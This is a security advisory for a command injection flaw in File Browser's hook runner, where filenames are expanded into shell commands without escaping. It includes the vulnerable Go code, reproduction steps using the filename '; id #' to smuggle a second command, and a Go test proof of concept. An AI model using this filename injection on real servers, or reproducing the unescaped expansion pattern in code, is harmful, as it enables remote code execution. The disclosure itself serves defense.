# GHSA-jvpw-637p-h3pw / CVE-2026-35585 —  Command Injection via Hook Runner

- Severity: high
- CWEs: CWE-78, CWE-88
- Affected: github.com/filebrowser/filebrowser/v2 >= 2.x
- Published: 2026-04-04T07:45:11Z
- URL: https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jvpw-637p-h3pw

---

> [!NOTE]
> **This feature has been disabled by default for all installations from v2.33.8 onwards, including for existent installations**. To exploit this vulnerability, the instance administrator must turn on a feature and ignore all the warnings about known vulnerabilities. We're publishing this new advisory to make it clear that all vulnerabilities concerning this feature are disclosed.
>
> For more information about tracking vulnerability issues related to the Command Execution features, check https://github.com/filebrowser/filebrowser/issues/5199.

## Overview

The hook system in File Browser — which executes administrator-defined shell commands on file events such as upload, rename, and delete — is vulnerable to OS command injection. Variable substitution for values like `$FILE` and `$USERNAME` is performed via `os.Expand` without sanitization. An attacker with file write permission can craft a malicious filename containing shell metacharacters, causing the server to execute arbitrary OS commands when the hook fires. This results in **Remote Code Execution (RCE)**.

## Affected Location

- **File:** `runner/runner.go`
- **Function:** `Runner.exec`

## Technical Details

`Runner.exec` expands template variables inside hook command strings using `os.Expand`:

```go
// runner/runner.go
envMapping := func(key string) string {
    switch key {
    case "FILE":
        return path       // attacker-controlled filename
    case "USERNAME":
        return username   // attacker-controlled username
    // ...
    }
}

for i, arg := range command {
    if i == 0 { continue }
    command[i] = os.Expand(arg, envMapping) // expands $FILE, $USERNAME, etc.
}
```

The expanded value is then passed as a shell argument string. `os.Expand` performs plain string substitution with no escaping. If an admin has configured a hook such as:

```
sh -c "echo created $FILE"
```

...and an attacker creates a file named `; id #`, the variable expansion produces:

```
sh -c "echo created /path/to/; id #"
```

The `;` terminates the `echo` command and the shell executes `id` with server privileges. The `#` character comments out the remainder, preventing syntax errors.

This pattern is exploitable across all hook events: `before_upload`, `after_upload`, `before_rename`, `after_rename`, `before_delete`, `after_delete`, etc.

## Attack Scenario / Reproduction Steps

1. Admin configures an `after_upload` hook: `sh -c "echo created $FILE"`.
2. The attacker (authenticated user with upload permission) uploads a file named `; id #`.
3. The upload succeeds and the hook fires automatically.
4. The server executes:
   ```sh
   sh -c "echo created /uploads/; id #"
   ```
5. The `id` command runs, confirming RCE.

## Impact

Any authenticated user with file create, upload, or rename permissions can achieve arbitrary RCE on the server when shell-based hooks are configured. The attacker does not need to know the exact hook command — any hook that embeds `$FILE` in a shell string is exploitable by crafting the filename accordingly.

## Proof of Concept

```go
package runner

import (
        "os"
        "testing"

        "github.com/filebrowser/filebrowser/v2/settings"
)

func TestPoC_FileHookInjection(t *testing.T) {
        // Simulate an admin-configured shell-based hook
        r := &Runner{
                Enabled: true,
                Settings: &settings.Settings{
                        Shell: []string{"sh", "-c"},
                        Commands: map[string][]string{
                                "after_upload": {"echo Uploaded $FILE"},
                        },
                },
        }

        // Malicious filename crafted by the attacker
        maliciousFilename := "/tmp/safe; id #"

        // Simulate the exec logic in runner/runner.go
        raw := r.Commands["after_upload"][0]
        command, _, _ := ParseCommand(r.Settings, raw)

        envMapping := func(key string) string {
                if key == "FILE" {
                        return maliciousFilename
                }
                return os.Getenv(key)
        }

        for i, arg := range command {
                if i == 0 {
                        continue
                }
                // os.Expand substitutes $FILE with the attacker-controlled filename —
                // no escaping is applied, so shell metacharacters pass through unchanged.
                command[i] = os.Expand(arg, envMapping)
        }

        // The resulting command argument is the injected shell script:
        // sh -c "echo Uploaded /tmp/safe; id #"
        expectedArg := "echo Uploaded /tmp/safe; id #"
        if command[2] != expectedArg {
                t.Errorf("Expected command argument %q, got %q", expectedArg, command[2])
        }

        t.Logf("Confirmed: filename injection succeeded. Shell will execute: %v", command)
}
```
